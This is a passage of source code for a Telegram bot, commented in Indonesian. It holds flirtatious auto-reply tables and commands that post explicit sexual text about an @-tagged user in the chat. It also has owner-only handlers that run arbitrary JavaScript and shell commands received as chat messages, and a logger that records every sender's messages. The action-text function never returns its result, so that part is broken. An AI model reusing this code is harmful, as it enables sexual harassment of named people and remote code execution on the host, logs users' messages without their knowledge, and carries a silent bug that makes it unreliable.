    { trigger: /ngapain/i, response: ["Lagi mikirin kamu nih 😘", "Lagi santai sambil nungguin kamu 😏", "Ngapain ya, emang ada yang mau? 😏", "Lagi disini kok, nungguin kamu 😘", "Gak ngapa-ngapain, cuma nunggu kamu doang 😏"] },
    { trigger: /kangen/i, response: ["Aku juga kangen kamu 😘", "Kangen banget sama kamu 😏", "Kangen! Ayo ketemu! 💖", "Kangen banget, kamu juga kan? 😘", "Aku kangen kamu, kapan kita ketemu? 💕"] },
    { trigger: /mau apa/i, response: ["Mau minta perhatian kamu nih 😘", "Mau sesuatu yang spesial 😏", "Mau bareng kamu, pasti asik banget 😏", "Mau apa ya, biar aku bisa bantu? 😘", "Mau banget bareng kamu 😏"] },
    { trigger: /jomblo/i, response: ["Jomblo itu pilihan kok, hehe 😏", "Jomblo, tapi gak kesepian kok 😘", "Jomblo ya? Ada aku kok, hehe 💕", "Bukan masalah, masih banyak yang bisa dilakukan 😘", "Jomblo? Tapi hati ini selalu buat kamu 💖"] },
    { trigger: /pacar/i, response: ["Pacar? Bisa jadi kamu 😏", "Kalo pacar sih, aku siap jadi pacarmu 😘", "Mau jadi pacarku? 💖", "Pacar ya? Hmm, siapa tau aku cocok 😘", "Aku sih siap jadi pacar kamu 😏"] },
    { trigger: /serius/i, response: ["Serius banget nih! 😳", "Aku serius banget sama kamu 😘", "Serius? Kamu gak nyangka aku bisa gini ya? 😏", "Aku serius loh, kamu mau apa? 😈", "Aku serius banget, ini bukan main-main 😏"] },
    { trigger: /makan/i, response: ["Mau makan bareng? Aku masak spesial buat kamu 😋", "Makan yuk, aku belum makan nih 😳", "Ayo makan bareng, pasti seru deh 😋", "Makan dulu ya, biar gak lapar 😏", "Makan apa ya? Ayo pilih menu 😏"] },
    { trigger: /bosen/i, response: ["Bosen ya? Ayo aku temenin 😘", "Bosen? Bisa kita atasi bareng kok 💕", "Bosen ya? Gimana kalau aku bawa kamu ke tempat seru? 😏", "Bosen? Jangan khawatir, aku selalu ada 😘", "Bosen? Yuk, kita ngobrol-ngobrol 😏"] },
    { trigger: /cewek/i, response: ["Cewek ya? Hati-hati, aku bisa jadi cewek yang spesial buat kamu 😏", "Cewek itu keren, tapi ada aku disini 💖", "Cewek? Kamu yang nyari? 😏", "Cewek? Bisa jadi kita bisa ngobrol panjang nih 😘", "Cewek? Siap-siap jadi temen ngobrol aku! 😏"] },
    { trigger: /ganteng|cakep/i, response: ["Ganteng ya? Terima kasih, kamu juga 😘", "Cakep ya? Iya, aku ganteng kan? 😏", "Kamu juga ganteng kok 😘", "Ganteng ya? Aku suka, jadi makin pengen deket 😏", "Wah, ganteng banget ya, baru sadar 😘"] },
    { trigger: /bidadari/i, response: ["Bidadari, siapa tuh? Aku bidadari kamu 😏", "Bidadari ya? Kamu cantik banget, jadi deh bidadari aku 💖", "Aku bidadari buat kamu kok 😘", "Bidadari? Kalo itu aku deh buat kamu 😏"] },
    { trigger: /manis/i, response: ["Manis banget ya? Tapi kamu lebih manis 😘", "Manis? Gimana kalo kita jalan bareng? 😏", "Aku suka yang manis, kayak kamu 😘", "Kamu manis banget loh, jadi pengen deket 😏"] },
    { trigger: /rindu/i, response: ["Aku juga rindu kamu 😘", "Rindu banget sama kamu 😏", "Rindu, ayo ketemu bareng 💖", "Rindu ya? Aku juga kangen banget 😘", "Sama-sama rindu, ayo kita ngobrol 😏"] },
    { trigger: /sayang/i, response: ["Sayang? Aku sayang banget sama kamu 😘", "Sayang, kamu itu penting banget buat aku 💖", "Sayang banget sama kamu, jadi pengen terus dekat 😏", "Sayang, aku selalu ada buat kamu 😘", "Sayang, nggak ada yang lebih penting dari kamu 😏"] },
    { trigger: /cinta/i, response: ["Cinta? Aku cinta sama kamu 💖", "Aku juga cinta sama kamu 😘", "Cinta itu indah, dan aku punya kamu 😏", "Cinta, cinta banget deh! Kamu yang aku cinta 😘", "Aku cinta banget sama kamu, tahu nggak? 💖"] },
    { trigger: /kenapa/i, response: ["Kenapa? Ada yang salah? 😳", "Kenapa ya? Apa yang bikin kamu bingung? 😏", "Kenapa? Aku siap bantu kok 😘", "Kenapa ya, ada yang bisa aku bantu? 😏", "Kenapa? Ceritain aja, aku disini buat kamu 😘"] },
    { trigger: /pergi/i, response: ["Pergi? Mau kemana? 😏", "Jangan pergi dulu, aku mau ngobrol 😘", "Kalo pergi, boleh gak? Ketemu nanti lagi 😏", "Pergi kemana, aku ikut dong 😏", "Jangan pergi deh, mending kita tetap ngobrol 😘"] },
    { trigger: /gabut/i, response: ["Gabut ya? Ayo ngobrol sama aku, pasti seru 😏", "Gabut juga, ayo kita bikin sesuatu yang seru 😘", "Gabut? Kamu bisa ngobrol sama aku kok 😏", "Gabut, ayo aku temenin 😘", "Gabut? Yuk, kita main bareng 😏"] },
    { trigger: /senang/i, response: ["Senang ya? Aku juga senang kok bisa ngobrol sama kamu 💖", "Senang banget! Kapan kita ketemu lagi? 😘", "Senang deh kalau kamu bahagia 😏", "Aku juga senang banget sama kamu 😘", "Senang, ayo kita buat lebih senang lagi 😏"] },
    { trigger: /sedih/i, response: ["Sedih? Ada apa? Ceritain aja, aku dengerin kok 😘", "Sedih? Aku disini buat kamu kok 💖", "Sedih, tapi jangan khawatir, aku bantu kamu 😏", "Sedih ya? Aku bisa buat kamu senang kok 😘", "Sedih? Yuk, ngobrol sama aku, biar lebih baik 😏"] },
    { trigger: /tanya/i, response: ["Tanya apa? Aku siap jawab 😘", "Tanya aja, aku bakal jawab kok 😏", "Tanya-tanya ya? Aku selalu siap 😘", "Tanya? Ayo langsung aja 😏", "Tanya apa? Aku siap bantu jawab kok 😘"] },
    { trigger: /dong/i, response: ["Dong? Apa yang kamu mau? 😏", "Dong? Aku bisa bantu kok 😘", "Dong? Gimana kalau aku bantu? 😏", "Apa dong? Aku siap bantu 😘", "Dong? Yuk, aku bantu apapun yang kamu butuhkan 😏"] },
    { trigger: /pengen/i, response: ["Pengen apa? Aku siap bantu 😘", "Pengen apa ya? Bisikin aku deh 😏", "Pengen apa? Aku juga pengen bareng kamu 😘", "Pengen apa? Jangan malu-malu ya 😏", "Pengen bareng aku? 😘"] },
    { trigger: /santai/i, response: ["Santai aja, aku di sini kok buat kamu 😘", "Santai, kita ngobrol santai aja 😏", "Santai ya, nggak ada yang buru-buru kok 😘", "Santai, ayo kita ngobrol lebih asik 😏", "Santai, aku juga lagi santai kok 😘"] },
    { trigger: /cerita/i, response: ["Cerita apa? Aku siap dengerin 😘", "Cerita apa? Aku juga pengen denger 😏", "Cerita dong, aku mau tahu 😘", "Cerita apa? Aku siap jadi pendengar yang baik 😏", "Cerita? Aku dengerin kok 😘"] },
    { trigger: /jaga/i, response: ["Aku selalu jaga kamu kok 😏", "Aku jaga kamu, jangan khawatir 😘", "Jaga ya, jangan sampai kehilangan 😘", "Jaga kamu, biar aman selalu 😏", "Aku selalu jaga kamu, tenang aja 😘"] },
    { trigger: /bercanda/i, response: ["Bercanda? Kamu bikin aku ketawa 😏", "Bercanda ya? Ayo lanjut, seru banget 😘", "Bercanda? Jadi tambah pengen bercanda bareng 😏", "Bercanda ya? Seru banget, aku suka 😘", "Bercanda, tapi jangan terlalu serius ya 😏"] },
    { trigger: /seru/i, response: ["Seru banget ya? Ayo kita lanjut 😘", "Seru? Kita bikin lebih seru lagi 😏", "Seru banget! Kamu juga bikin seru 😘", "Seru? Ayo kita buat lebih seru 😏", "Seru, ayo bareng aku lebih seru lagi 😘"] },
    { trigger: /nyaman/i, response: ["Nyaman ya? Aku juga nyaman ngobrol sama kamu 😘", "Nyaman banget, kayak rumah sendiri 😏", "Nyaman, aku senang bisa ada buat kamu 💖", "Nyaman ya? Aku juga senang banget 😘", "Nyaman, aku juga suka banget 😏"] },
    { trigger: /tenang/i, response: ["Tenang, aku selalu ada untuk kamu 💖", "Tenang aja, semuanya bakal baik-baik aja 😘", "Tenang ya, aku bantu kamu kok 😏", "Tenang, gak usah khawatir 😘", "Tenang, semuanya bakal jadi lebih baik 😏"] },
    { trigger: /bener/i, response: ["Bener banget! Kamu pintar! 😏", "Bener, aku gak pernah salah kok 😘", "Bener banget, jadi makin keren nih 😏", "Bener ya? Aku setuju banget 😘", "Bener, ini udah pasti 😏"] },
    { trigger: /bisa/i, response: ["Bisa kok, aku pasti bisa bantu 😘", "Bisa! Aku pasti bisa 😏", "Bisa banget, gak ada yang gak bisa 😘", "Bisa! Aku siap bantu kamu 😏", "Bisa kok, jangan ragu 😘"] },
    { trigger: /boleh/i, response: ["Boleh kok, ayo langsung aja 😘", "Boleh banget, aku tunggu deh 😏", "Boleh, ayo kita mulai 😘", "Boleh, aku siap bantu 😏", "Boleh, gak ada yang gak boleh 😘"] }
];

// Aktifin / Nonaktifin ChatMode
bot.onText(/\/chatmode (on|off)/i, (msg, match) => {
    chatMode = match[1].toLowerCase() === "on";
    bot.sendMessage(msg.chat.id, `🔥 ChatMode ${chatMode ? "AKTIF" : "NONAKTIF"}!`, { parse_mode: "Markdown" });
});

// Auto-Reply berdasarkan pesan user
bot.on("message", (msg) => {
    if (!chatMode || msg.text.startsWith("/")) return; // Cegah trigger pas ChatMode mati atau command lain

    let text = msg.text.toLowerCase();

    for (let { trigger, response } of replies) {
        if (trigger.test(text)) {
            let reply = response[Math.floor(Math.random() * response.length)]; // Pilih random dari variasi
            bot.sendMessage(msg.chat.id, reply, { parse_mode: "Markdown" });
            break;
        }
    }
});

// Define modes
const modes = {
    slow: "Mode: Slow",
    medium: "Mode: Medium",
    hard: "Mode: Hard"
};

function generateActionText(command, sender, target, mode) {
// Define actions
const actions = {
    kiss: {
        slow: `${modes.slow} _${sender} mencium bibir ${target} perlahan, menikmati setiap detiknya... Rasanya manis banget 😘_`,
        medium: `${modes.medium} _${sender} mencium leher ${target}, meninggalkan jejak hangat... Semakin dekat, semakin terasa 😏🔥_`,
        hard: `${modes.hard} _${sender} mencium tubuh ${target} dengan penuh gairah... Rasanya semakin panas 😳💦🔥_`
    },
    hug: {
        slow: `${modes.slow} _${sender} memeluk ${target} dengan lembut, merasakan kehangatan tubuhnya... Udah nyaman gitu? 😘_`,
        medium: `${modes.medium} _${sender} memeluk ${target} erat, mendekapnya seperti nggak mau lepas... Gimana rasanya? 😏🔥_`,
        hard: `${modes.hard} _${sender} memeluk ${target} dengan kekuatan penuh, hampir membuatnya sesak... Mau lagi? 😳💦🔥_`
    },
    tease: {
        slow: `${modes.slow} _${sender} menggoda ${target} perlahan, memberikan senyum nakal yang bikin deg-degan... Mau nambahin? 😘_`,
        medium: `${modes.medium} _${sender} menggoda ${target} dengan bisikan, menunggu reaksi dari tubuhnya... Kok makin panas? 😏🔥_`,
        hard: `${modes.hard} _${sender} menggoda ${target} tanpa ampun, membuatnya terhanyut dalam godaan... Gimana, tahan nggak? 😳💦🔥_`
    },
    caress: {
        slow: `${modes.slow} _${sender} mengusap wajah ${target} dengan lembut, menenangkan pikiran dan tubuhnya... Nyaman gitu? 😘_`,
        medium: `${modes.medium} _${sender} mengusap paha ${target} dengan lembut, seakan ingin lebih dekat... Gimana rasanya? 😏🔥_`,
        hard: `${modes.hard} _${sender} mengusap tubuh ${target} dengan penuh gairah, tidak bisa berhenti... Kok makin panas? 😳💦🔥_`
    },
    pinch: {
        slow: `${modes.slow} _${sender} mencubit telinga ${target} pelan, membuatnya terkejut... Kenapa rasanya jadi panas? 😘_`,
        medium: `${modes.medium} _${sender} mencubit bibir ${target}, meninggalkan jejak merah yang menggoda... Mau lanjut? 😏🔥_`,
        hard: `${modes.hard} _${sender} mencubit tubuh ${target} dengan kuat, membuatnya tersentak... Gimana, nggak sakit? 😳💦🔥_`
    },
    grope: {
        slow: `${modes.slow} _${sender} meraba lembut tubuh ${target}... Rasanya makin mendalam, ya? 😘_`,
        medium: `${modes.medium} _${sender} meraba tubuh ${target} dengan penuh gairah, semakin mendekat... Mau lebih? 😏🔥_`,
        hard: `${modes.hard} _${sender} meraba tubuh ${target} dengan ganas, hampir membuatnya kehilangan kendali... Gimana, kuat nggak? 😳💦🔥_`
    },
    lick: {
        slow: `${modes.slow} _${sender} menjilat bibir ${target} dengan lembut, membiarkan sensasi hangatnya menyebar... Mau coba lagi? 😘_`,
        medium: `${modes.medium} _${sender} menjilat leher ${target} dengan perlahan, menciptakan sensasi panas yang membara... Rasanya nggak bisa berhenti 😏🔥_`,
        hard: `${modes.hard} _${sender} menjilat tubuh ${target} dengan penuh gairah, membuatnya terperangah... Kok makin panas? 😳💦🔥_`
    },
    suck: {
        slow: `${modes.slow} _${sender} menghisap telinga ${target} perlahan, meninggalkan tanda kecil di kulitnya... Rasanya manis banget 😘_`,
        medium: `${modes.medium} _${sender} menghisap leher ${target}, memberikan tanda yang menandakan rasa milikmu... Nggak bisa berhenti 😏🔥_`,
        hard: `${modes.hard} _${sender} menghisap tubuh ${target} dengan penuh gairah, meninggalkan bekas yang nggak bisa hilang... Mau lanjut? 😳💦🔥_`
    },
    thrust: {
        slow: `${modes.slow} _${sender} mendorong tubuh ${target} perlahan, mengubah posisi sedikit demi sedikit... Gimana rasanya? 😘_`,
        medium: `${modes.medium} _${sender} mendorong lebih dalam, membuat tubuhnya semakin terhanyut dalam arus nafsu... Semakin mendalam 😏🔥_`,
        hard: `${modes.hard} _${sender} mendorong tubuh ${target} dengan kekuatan penuh, membuatnya terhanyut dalam rasa yang tak terkatakan... Gimana, udah nggak bisa berhenti? 😳💦🔥_`
    },
    anal: {
        slow: `${modes.slow} _${sender} menyentuh perlahan bagian belakang ${target}... Rasanya nyaman, bukan? 😘_`,
        medium: `${modes.medium} _${sender} masuk lebih dalam, semakin merasakan sensasi ketatnya... Kok makin enak ya? 😏🔥_`,
        hard: `${modes.hard} _${sender} menekan lebih keras, merasakan perbedaan yang sangat tajam... Gimana rasanya? 😳💦🔥_`
    },
    fuck: {
        slow: `${modes.slow} _${sender} membelai tubuh ${target} dengan lembut, menciptakan ketenangan... Mau lanjut? 😘_`,
        medium: `${modes.medium} _${sender} mulai menggoda ${target} dengan penuh gairah... Kok makin panas? 😏🔥_`,
        hard: `${modes.hard} _${sender} menghantam tubuh ${target} dengan penuh gairah dan kekuatan, hampir tidak bisa dihentikan... Rasanya semakin liar 😳💦🔥_`
    },
    deep: {
        slow: `${modes.slow} _${sender} membisikkan kata-kata nakal ke telinga ${target}... Menggoda dengan pelan 😘_`,
        medium: `${modes.medium} _${sender} masuk lebih dalam ke tubuh ${target}... Rasanya semakin terobsesi 😏🔥_`,
        hard: `${modes.hard} _${sender} masuk lebih dalam, membuat tubuh ${target} menggigil... Tahan nggak? 😳💦🔥_`
    },
    bounce: {
        slow: `${modes.slow} _${sender} menggoyangkan tubuhnya pelan-pelan, menunggu respon dari ${target}... Udah siap? 😘_`,
        medium: `${modes.medium} _${sender} menggoyangkan lebih cepat, semakin menggetarkan tubuh ${target}... Gimana? 😏🔥_`,
        hard: `${modes.hard} _${sender} mengguncang tubuh ${target} tanpa henti, semakin cepat dan keras... Kok nggak bisa berhenti? 😳💦🔥_`
    },
    squirt: {
        slow: `${modes.slow} _${sender} merasa sesuatu yang hangat mengalir dari tubuh ${target}... Rasanya nyaman banget 😘_`,
        medium: `${modes.medium} _${sender} nggak bisa menahan lagi... Cairan itu mulai keluar! 😏🔥_`,
        hard: `${modes.hard} _${sender} menyemprotkan cairan panas tanpa henti ke tubuh ${target}... Udah basah semua! 😳💦🔥_`
    },
    fingering: {
        slow: `${modes.slow} _${sender} menggerakkan jarinya pelan-pelan, menyentuh bagian sensitif ${target}... Mau coba rasain? 😘_`,
        medium: `${modes.medium} _${sender} mulai memijat bagian tubuh ${target} yang sensitif, rasanya makin intens... Gimana? 😏🔥_`,
        hard: `${modes.hard} _${sender} melakukannya lebih keras, tidak bisa berhenti... Gimana, kuat nggak? 😳💦🔥_`
    }
  }
};

// Handle commands
const susCommands = ['kiss', 'hug', 'tease', 'caress', 'pinch', 'grope', 'lick', 'suck', 'thrust', 'anal', 'fuck', 'deep', 'bounce', 'squirt', 'fingering'];

susCommands.forEach((cmd) => {
    bot.onText(new RegExp(`/${cmd} @([a-zA-Z0-9_]+) (Slow|Medium|Hard)$`, "i"), (msg, match) => {
        const chatId = msg.chat.id;
        const sender = msg.from.username ? `@${msg.from.username}` : "Seseorang";
        const target = `@${match[1]}`;
        const mode = match[2].toLowerCase();

        const actionText = generateActionText(cmd, sender, target, mode);
        bot.sendMessage(chatId, actionText, { parse_mode: "Markdown" });
    });
});

 















// End Of Bot

// 🔹 Eval Async `=>`
bot.onText(/^=>(.+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    if (!isOwner(msg.from.id)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    bot.sendMessage(chatId, global.mess.loading);
    try { 
        let result = await eval(`(async () => { return ${match[1]} })()`);
        bot.sendMessage(chatId, util.format(result)); 
        updateBotStats("command");
    } catch (e) { 
        bot.sendMessage(chatId, `❌ Error: ${String(e)}`);
        console.log("[Eval Async Error]", e);
    } 
});

// 🔹 Eval Normal `>`
bot.onText(/^>(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!isOwner(msg.from.id)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    bot.sendMessage(chatId, global.mess.loading);
    try {
        let evaled = await eval(match[1]); 
        if (typeof evaled !== 'string') evaled = util.inspect(evaled); 
        bot.sendMessage(chatId, evaled);
        updateBotStats("command");
    } catch (err) {
        bot.sendMessage(chatId, `❌ Error: ${String(err)}`);
        console.log("[Eval Error]", err);
    }
});

// 🔹 Exec Shell Command `$`
bot.onText(/^\$(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isOwner(msg.from.id)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    bot.sendMessage(chatId, global.mess.loading);
    exec(match[1], (err, stdout, stderr) => {
        if (err) return bot.sendMessage(chatId, `❌ Error: ${err.message}`);
        if (stderr) return bot.sendMessage(chatId, `⚠️ Stderr: ${stderr}`);
        if (stdout) bot.sendMessage(chatId, stdout);
        updateBotStats("command");
    });
});

// Fungsi untuk menampilkan pesan dengan style keren di console
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const senderName = msg.from.first_name || msg.from.username || 'Unknown';
    const messageText = msg.text || 'No message text';
    const messageTime = new Date(msg.date * 1000).toLocaleString(); // Mengubah timestamp ke format waktu yang lebih mudah dibaca

    // Menampilkan pesan dengan style keren
    console.log(`\x1b[36m[NEW MESSAGE]\x1b[0m`);
    console.log(`\x1b[32mSender:\x1b[0m ${senderName}`);
    console.log(`\x1b[33mTime:\x1b[0m ${messageTime}`);
    console.log(`\x1b[35mMessage:\x1b[0m ${messageText}`);
    console.log(`\x1b[36m--------------------------\x1b[0m`);
});
bot.on("polling_error", (err) => {
    console.error("Polling Error:", err);
});
// 🔹 Fetch proxies saat bot mulai
fetchProxies();
